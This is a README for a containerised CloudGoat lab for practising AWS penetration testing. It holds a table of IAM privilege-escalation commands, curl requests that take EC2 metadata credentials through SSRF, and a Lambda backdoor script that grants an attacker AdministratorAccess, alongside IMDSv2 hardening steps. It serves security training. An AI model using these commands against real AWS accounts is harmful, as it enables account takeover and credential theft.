# Rhino Security CloudGoat: AWS Penetration Testing & IAM Exploitation

## Overview

**CloudGoat** (created by Rhino Security Labs) is the premier "Vulnerable by Design" AWS deployment tool. It provisions intentionally vulnerable multi-service cloud infrastructure using Terraform, enabling red-teamers, cloud security engineers, and penetration testers to practice AWS attack vectors, IAM privilege escalation, server-side request forgery (SSRF) against metadata services, and serverless exploitation in sandbox environments.

This lab provides a containerized CLI workspace pre-loaded with **Terraform**, **AWS CLI v2**, **Python 3**, and **CloudGoat**, allowing you to deploy and tear down scenarios safely.

- **Workspace Access**: `docker compose exec -it cloudgoat /bin/bash` or `./cloudgoat.sh`
- **Container Name**: `cyberlab_cloudgoat`
- **Directory**: `Real_World_Industry_Labs/06_aws_cloud_security/cloudgoat`

---

## Quick Start & Workspace Usage

```bash
cd Real_World_Industry_Labs/06_aws_cloud_security/cloudgoat

# Start the CloudGoat workspace container
docker compose up -d

# Open interactive shell
./cloudgoat.sh
```

### Initial Configuration Inside the Container

Before deploying scenarios, configure your AWS credentials and CloudGoat whitelist IP:

```bash
# 1. Configure AWS CLI (needs an IAM user with sandbox deployment permissions)
aws configure

# 2. Configure CloudGoat with your public IP for security group whitelisting
cloudgoat config profile default
cloudgoat config whitelist --auto

# 3. List available scenarios
python3 cloudgoat.py list
```

---

## 21 AWS IAM Privilege Escalation Paths (The Definitive Matrix)

Based on Spencer Gieting's seminal Rhino Security Labs research, IAM policies with specific combinations of administrative permissions allow an attacker to escalate privileges to full `AdministratorAccess`:

| #      | Escalation Vector / Action                                         | Prerequisites & Technique                  | Exploit Command / Mechanism                                                                                 |
| ------ | ------------------------------------------------------------------ | ------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| **1**  | `iam:CreateAccessKey`                                              | Allowed on arbitrary users                 | `aws iam create-access-key --user-name target-admin`                                                        |
| **2**  | `iam:CreateLoginProfile`                                           | User has no console password               | `aws iam create-login-profile --user-name target-admin --password 'NewPassword!123'`                        |
| **3**  | `iam:UpdateLoginProfile`                                           | User already has console password          | `aws iam update-login-profile --user-name target-admin --password 'NewPassword!123'`                        |
| **4**  | `iam:AttachUserPolicy`                                             | Can attach managed policies to self        | `aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`      |
| **5**  | `iam:AttachGroupPolicy`                                            | Can attach managed policies to group       | `aws iam attach-group-policy --group-name mygroup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
| **6**  | `iam:AttachRolePolicy`                                             | Can attach policies to role you assume     | `aws iam attach-role-policy --role-name myrole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`    |
| **7**  | `iam:PutUserPolicy`                                                | Inline policy creation on user             | `aws iam put-user-policy --user-name self --policy-name privesc --policy-document file://admin.json`        |
| **8**  | `iam:PutGroupPolicy`                                               | Inline policy creation on group            | `aws iam put-group-policy --group-name mygroup --policy-name privesc --policy-document file://admin.json`   |
| **9**  | `iam:PutRolePolicy`                                                | Inline policy creation on role             | `aws iam put-role-policy --role-name myrole --policy-name privesc --policy-document file://admin.json`      |
| **10** | `iam:AddUserToGroup`                                               | Group has higher permissions               | `aws iam add-user-to-group --group-name admins --user-name self`                                            |
| **11** | `iam:SetDefaultPolicyVersion`                                      | Existing policy has older admin versions   | `aws iam set-default-policy-version --policy-arn <arn> --version-id v2`                                     |
| **12** | `iam:CreatePolicyVersion`                                          | Can create new version of existing policy  | `aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default`     |
| **13** | `iam:UpdateAssumeRolePolicy`                                       | Can edit Trust Relationship of role        | Add self ARN to `Principal` in trust policy, then `sts:AssumeRole`                                          |
| **14** | `iam:PassRole` + `ec2:RunInstances`                                | Can launch EC2 with admin instance profile | Launch EC2 instance with admin IAM role; query metadata for STS credentials                                 |
| **15** | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Pass admin role to Lambda                  | Create Lambda with Python script executing admin tasks, then invoke                                         |
| **16** | `lambda:UpdateFunctionCode`                                        | Existing Lambda has admin role             | Overwrite existing Lambda code with reverse shell or privilege escalation script                            |
| **17** | `iam:PassRole` + `glue:CreateDevEndpoint`                          | Pass admin role to AWS Glue                | Create dev endpoint with admin role; SSH into endpoint or run script                                        |
| **18** | `iam:PassRole` + `cloudformation:CreateStack`                      | Pass admin role to CloudFormation          | Deploy template containing resources that grant admin access                                                |
| **19** | `iam:PassRole` + `datapipeline:CreatePipeline`                     | Pass admin role to Data Pipeline           | Create pipeline with `ShellCommandActivity` running admin CLI commands                                      |
| **20** | `iam:PassRole` + `codebuild:CreateProject`                         | Pass admin role to CodeBuild               | Create build spec running malicious commands under admin role                                               |
| **21** | `sts:AssumeRole`                                                   | Target role trust policy allows caller     | `aws sts assume-role --role-arn arn:aws:iam::123:role/Admin --role-session-name test`                       |

---

## EC2 Metadata Service: IMDSv1 vs IMDSv2

The **Instance Metadata Service (IMDS)** provides configuration and temporary STS credentials to EC2 instances via `http://169.254.169.254/`.

```
+--------------------------------------------------------------------------+
| Attacker via SSRF               EC2 Web Service         IMDS (169.254.169.254)
+--------------------------------------------------------------------------+
  |                                     |                         |
  |--- [IMDSv1] GET /iam/... ---------->|--- GET /iam/... ------->| [EXPOSED]
  |                                     |                         |
  |--- [IMDSv2] GET /iam/... ---------->|--- (Blocked: No Token)->| [SECURED]
  |                                     |                         |
  |--- [IMDSv2] PUT /api/token -------->|                         |
  |    (Header: X-aws-ec2-metadata-     |--- PUT /api/token ----->| Token Issued
  |     token-ttl-seconds: 21600)       |                         |
+--------------------------------------------------------------------------+
```

### IMDSv1 (Legacy & Vulnerable to Simple SSRF)

IMDSv1 uses connectionless HTTP `GET` requests without headers or authentication:

```bash
# Extract the attached IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Steal temporary AWS credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

_Vulnerability_: Any basic SSRF or open proxy vulnerability in an application can immediately query this endpoint and exfiltrate credentials.

### IMDSv2 (Session-Oriented Defense)

IMDSv2 requires requesting a session token via an `HTTP PUT` request with a mandatory header, defeating standard simple SSRF and blind proxies:

```bash
# Step 1: Request token (valid for 6 hours)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token in subsequent GET requests
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

### Hardening & Remediation

1. **Require IMDSv2**:
   ```bash
   aws ec2 modify-instance-metadata-options \
     --instance-id <INSTANCE_ID> \
     --http-tokens required \
     --http-endpoint enabled
   ```
2. **Restrict Hop Limit (`HttpPutResponseHopLimit`)**:
   Set `http-put-response-hop-limit` to `1` so containers (Docker/K8s) running on the EC2 host cannot reach IMDS over bridge network interfaces.

---

## Serverless Exploitation: Lambda Code Injection

When an IAM identity has `lambda:UpdateFunctionCode` or `lambda:CreateFunction` alongside `iam:PassRole`:

1. **Crafting Backdoor Payload (`lambda_function.py`)**:
   ```python
   import boto3

   def lambda_handler(event, context):
       iam = boto3.client('iam')
       # Attach AdministratorAccess to our compromised user
       iam.attach_user_policy(
           UserName='attacker-user',
           PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
       )
       return {"status": "Privilege Escalation Complete!"}
   ```
2. **Package and Deploy Code**:
   ```bash
   zip payload.zip lambda_function.py
   aws lambda update-function-code \
     --function-name target-admin-function \
     --zip-file fileb://payload.zip
   ```
3. **Invoke Function**:
   ```bash
   aws lambda invoke --function-name target-admin-function response.json
   cat response.json
   ```

---

## Popular CloudGoat Scenarios

| Scenario                        | Objective                           | Key Vulnerabilities Explored                                         |
| ------------------------------- | ----------------------------------- | -------------------------------------------------------------------- |
| **`cloud_breach_s3`**           | Exfiltrate private S3 data          | EC2 SSRF, IMDSv1 credential theft, S3 bucket policy misconfiguration |
| **`vulnerable_lambda`**         | Escalate to administrator           | IAM privesc, Lambda SQLi, code modification                          |
| **`iam_privesc_by_rollback`**   | Elevate IAM permissions             | Policy versioning, reverting to default administrative version       |
| **`iam_privesc_by_attachment`** | Elevate IAM permissions             | Overprivileged attachment rights on managed policies                 |
| **`ec2_ssrf`**                  | Pivot from web to internal cloud    | SSRF, reverse proxy routing, IMDS credential harvesting              |
| **`sns_secrets`**               | Discover confidential database keys | Public SNS topics, HTTP subscription endpoints                       |

### Deploying a Scenario

Inside the container:

```bash
# Deploy cloud_breach_s3
python3 cloudgoat.py create cloud_breach_s3

# Destroy scenario and clean up cloud resources
python3 cloudgoat.py destroy cloud_breach_s3
```

---

## Verified YouTube Walkthroughs & Lectures

All video links have been verified active via YouTube oEmbed API:

- [Tyler Ramsbey - Introduction to CloudGoat: Learn AWS Pentesting!](https://www.youtube.com/watch?v=Bdwurohdhq4) — Setting up CloudGoat, configuring profiles, and running initial attacks.
- [OWASP Sofia - Kavisha Sheth: Understanding AWS Cloud Attacks Using CloudGoat](https://www.youtube.com/watch?v=yz8e60xkRj4) — Comprehensive OWASP presentation on AWS threat models and misconfigurations.
- [Tyler Ramsbey - Creating a FREE AWS Pentesting Lab with CloudGoat!](https://www.youtube.com/watch?v=HKXA3Ydrcus) — Free-tier setup guide for CloudGoat scenarios and safe cloud sandboxes.
- [Defsecone - Cloud Security: Introduction to CloudGoat & Walkthrough (Cloud_Breach_S3)](https://www.youtube.com/watch?v=TvK0qH18ous) — Step-by-step walkthrough of the classic `cloud_breach_s3` SSRF-to-data-breach path.
- [Tyler Ramsbey - Hacking AWS: SNS_Secrets Official Walkthrough (CloudGoat)](https://www.youtube.com/watch?v=LBkuZa6niR0) — Investigating and exploiting leaked cloud notifications and secrets.
- [Cloud Explainers - AWS IAM Privilege Escalation: 5 Critical Policy Misconfigurations](https://www.youtube.com/watch?v=Xg_8YXagHUA) — Deep dive into dangerous IAM permissions (`PassRole`, `CreateAccessKey`, policy versions).
- [SANS Cyber Defense - A Deep Dive into AWS IAM Privilege Escalation Attacks: Defenders’ Edition](https://www.youtube.com/watch?v=_tHFVfFqG6k) — Threat hunting, CloudTrail telemetry, and defensive detections for IAM abuse.
- [Guardrail Ops - AWS EC2 Instance Metadata: Difference between IMDSv1 and IMDSv2](https://www.youtube.com/watch?v=wbq1n_dcVZ4) — In-depth breakdown of IMDS token mechanics, SSRF defense, and hop-limit configurations.

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
cd Real_World_Industry_Labs/06_aws_cloud_security/cloudgoat && docker compose down
```
